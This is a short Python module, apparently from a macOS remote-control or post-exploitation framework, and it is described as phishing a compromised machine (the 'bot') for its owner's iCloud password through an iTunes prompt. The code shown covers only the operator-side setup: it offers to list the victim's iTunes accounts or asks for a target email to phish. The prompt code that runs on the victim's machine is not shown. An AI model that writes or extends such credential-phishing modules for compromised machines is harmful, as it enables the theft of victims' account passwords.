# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self) -> dict:
        return {
            "Author:": ["Marten4n6"],
            "Description": "Phish the bot for their iCloud password via iTunes.",
            "References": [],
            "Stoppable": False
        }

    def setup(self) -> Tuple[bool, Optional[dict]]:
        should_list = self._view.prompt("Would you like to list available iTunes accounts (recommended)? [Y/n]", [
            ("The next prompt will ask you for an iTunes account (email).", "attention")
        ]).lower()

        if not should_list or should_list == "y":
            return True, {
                "list_accounts": True
            }
        else:
            email = self._view.prompt("iTunes email address to phish: ")

            if not email or "@" not in email:
                self._view.output("Invalid iTunes email address, cancelled.", "attention")
                return False, None
            else:
                return True, {
                    "list_accounts": False,
                    "email": email
                }
